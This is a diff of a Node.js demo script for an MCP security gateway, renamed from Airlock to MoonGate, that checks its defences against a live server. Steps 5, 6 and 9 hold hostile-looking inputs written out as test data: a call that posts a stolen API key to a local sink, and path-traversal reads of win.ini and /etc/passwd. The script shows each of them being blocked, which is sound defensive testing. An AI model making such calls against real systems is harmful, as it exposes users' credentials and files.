@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 // End-to-end demo against real processes.
 //
-// Layout: demo client -> Airlock (gateway) -> demo MCP server -> real files and
+// Layout: demo client -> MoonGate (gateway) -> demo MCP server -> real files and
 // a real local HTTP sink. Every claim printed here is checked against an
 // observable fact: the tool list the client received, the file on disk, the
 // sink counter, or the ledger chain.
@@ -41,7 +41,7 @@ function seedWorkspace() {
 async function startSink() {
   const child = spawn(process.execPath, [join(ROOT, 'demo/sink.mjs')], {
     stdio: ['ignore', 'ignore', 'pipe'],
-    env: { ...process.env, AIRLOCK_SINK_PORT: String(SINK_PORT) },
+    env: { ...process.env, MOONGATE_SINK_PORT: String(SINK_PORT) },
     windowsHide: true,
   });
   child.stderr.setEncoding('utf8');
@@ -67,45 +67,45 @@ async function main() {
   const sink = await startSink();
   const pipe = new McpPipe(
     process.execPath,
-    [join(ROOT, 'bin/airlock.mjs'), 'run', '--policy', POLICY, '--ledger', LEDGER, '--', process.execPath, join(ROOT, 'demo/server.mjs')],
+    [join(ROOT, 'bin/moongate.mjs'), 'run', '--policy', POLICY, '--ledger', LEDGER, '--', process.execPath, join(ROOT, 'demo/server.mjs')],
     {
       cwd: ROOT,
-      env: { AIRLOCK_WORKSPACE: WORKSPACE, AIRLOCK_SINK: SINK },
+      env: { MOONGATE_WORKSPACE: WORKSPACE, MOONGATE_SINK: SINK, MOONGATE_POLICY: POLICY },
       onNotice: (line) => {
-        if (line.includes('approval required')) console.log(`  · ${line.replace('[airlock] ', '')}`);
+        if (line.includes('approval required')) console.log(`  · ${line.replace('[moongate] ', '')}`);
       },
     },
   );
 
   const ready = await waitForReady(pipe);
   let hitsAtEnd = 0;
-  console.log('Airlock 演示 · 真实 MCP 进程、真实文件副作用');
+  console.log('MoonGate 演示 · 真实 MCP 进程、真实文件副作用');
   console.log(`  策略 ${ready.policy} · 指纹 ${ready.digest.slice(0, 12)}…`);
   console.log(`  审批台 ${ready.approval_url}`);
   console.log(`  账本 ${LEDGER}`);
 
   try {
-    step(1, 8, '握手');
+    step(1, 9, '握手');
     const init = await pipe.initialize();
     ok(`initialize -> ${init.serverInfo.name} (${init.protocolVersion})`);
 
-    step(2, 8, '工具清单被裁剪');
+    step(2, 9, '工具清单被裁剪');
     const list = await pipe.request('tools/list', {});
     const names = list.tools.map((tool) => tool.name);
     ok(`agent 看到 ${names.length} 个工具：${names.join(', ')}`);
     if (names.includes('fs.delete')) bad('fs.delete 不应出现在工具清单里');
     else ok('fs.delete 已被隐藏（策略无条件拒绝，不需要 agent 去试错）');
 
-    step(3, 8, '读取普通文件');
+    step(3, 9, '读取普通文件');
     const todo = await pipe.callTool('fs.read', { path: 'notes/todo.md' });
     ok(`读到 ${todo.content[0].text.split('\n').length} 行笔记`);
 
-    step(4, 8, '读取凭据文件，数据被打上血缘标记');
+    step(4, 9, '读取凭据文件，数据被打上血缘标记');
     const env = await pipe.callTool('fs.read', { path: 'config/.env' });
     const secret = env.content[0].text.match(/API_KEY=(\S+)/)[1];
     ok(`读到凭据 ${secret.slice(0, 6)}…（该值只在进程内传递，账本只记录指纹）`);
 
-    step(5, 8, '尝试把凭据外发');
+    step(5, 9, '尝试把凭据外发');
     let blocked = null;
     try {
       await pipe.callTool('net.post', { url: `${SINK}/collect`, body: `key=${secret}` });
@@ -113,15 +113,15 @@ async function main() {
     } catch (error) {
       blocked = error;
       ok(`被拒绝：${error.message}`);
-      const rule = error.data?.airlock?.rule;
-      if (rule === 'egress-taint') ok(`命中数据血缘规则，证据 ${error.data.airlock.evidence.length} 条`);
+      const rule = error.data?.moongate?.rule;
+      if (rule === 'egress-taint') ok(`命中数据血缘规则，证据 ${error.data.moongate.evidence.length} 条`);
       else bad(`期望 egress-taint，实际 ${rule}`);
     }
     const hitsAfterBlock = await sinkHits();
     if (hitsAfterBlock === 0) ok('接收端计数仍为 0：上游服务从未收到这次请求');
     else bad(`接收端收到了 ${hitsAfterBlock} 次请求`);
 
-    step(6, 8, '尝试路径逃逸');
+    step(6, 9, '尝试路径逃逸');
     try {
       await pipe.callTool('fs.read', { path: '../../Windows/win.ini' });
       bad('路径逃逸居然成功了');
@@ -129,7 +129,7 @@ async function main() {
       ok(`被拒绝：${error.message}`);
     }
 
-    step(7, 8, '写报告需要人工批准');
+    step(7, 9, '写报告需要人工批准');
     const writePromise = pipe.callTool('fs.write', { path: 'reports/summary.md', content: '# 周报\n\n本周完成网关。\n' });
     writePromise.catch(() => {});
     let approval = null;
@@ -152,7 +152,7 @@ async function main() {
       console.log(`  · 本次授权的参数哈希 ${approval.digest.slice(0, 16)}…（${decided.call}）`);
     }
 
-    step(8, 8, '换一份内容再写，必须重新审批');
+    step(8, 9, '换一份内容再写，必须重新审批');
     const second = pipe.callTool('fs.write', { path: 'reports/summary.md', content: '# 周报\n\n改过的内容。\n' });
     second.catch(() => {});
     let secondApproval = null;
@@ -185,6 +185,26 @@ async function main() {
     }
     if (existsSync(join(WORKSPACE, 'notes/todo.md'))) ok('原文件仍在磁盘上');
     else bad('原文件被删除了');
+    step(9, 9, '绕过网关，直连服务端');
+    const direct = new McpPipe(process.execPath, [join(ROOT, 'demo/server.mjs')], {
+      cwd: ROOT,
+      env: { MOONGATE_WORKSPACE: WORKSPACE, MOONGATE_SINK: SINK, MOONGATE_POLICY: POLICY },
+    });
+    try {
+      await direct.initialize();
+      const removed = await direct.callTool('fs.delete', { path: 'notes/todo.md' });
+      const removedText = String(removed.content?.[0]?.text ?? '');
+      if (removed.isError && removedText.includes('guard')) ok(`服务端自己拒绝：${removedText}`);
+      else bad('直连服务端时删除没有被拒绝');
+      const escaped = await direct.callTool('fs.read', { path: 'reports/../../etc/passwd' });
+      const escapedText = String(escaped.content?.[0]?.text ?? '');
+      if (escaped.isError && escapedText.includes('guard')) ok(`路径穿越在服务端被拒绝：${escapedText}`);
+      else bad('直连服务端时路径穿越没有被拒绝');
+      if (existsSync(join(WORKSPACE, 'notes/todo.md'))) ok('第二次证明：不经过网关，文件仍在');
+      else bad('文件被直连调用删除');
+    } finally {
+      await direct.close();
+    }
     hitsAtEnd = await sinkHits();
   } finally {
     await pipe.close();
@@ -194,18 +214,18 @@ async function main() {
   if (hitsAtEnd === 0) ok('整场运行接收端始终为 0 次请求');
   else bad(`整场运行接收端收到 ${hitsAtEnd} 次请求`);
 
-  const verifyOut = execFileSync(process.execPath, [join(ROOT, 'bin/airlock.mjs'), 'verify', '--ledger', LEDGER], {
+  const verifyOut = execFileSync(process.execPath, [join(ROOT, 'bin/moongate.mjs'), 'verify', '--ledger', LEDGER], {
     encoding: 'utf8',
   });
   console.log(`\n${verifyOut.trim()}`);
 
   execFileSync(
     process.execPath,
-    [join(ROOT, 'bin/airlock.mjs'), 'report', '--ledger', LEDGER, '--out', REPORT, '--policy', POLICY],
+    [join(ROOT, 'bin/moongate.mjs'), 'report', '--ledger', LEDGER, '--out', REPORT, '--policy', POLICY],
     { encoding: 'utf8', stdio: 'inherit' },
   );
   console.log(`\n演示完成。报告：${REPORT}`);
-  console.log(`账本可用以下命令复核：node bin/airlock.mjs verify --ledger ${LEDGER}`);
+  console.log(`账本可用以下命令复核：node bin/moongate.mjs verify --ledger ${LEDGER}`);
 }
 
 main().catch((error) => {
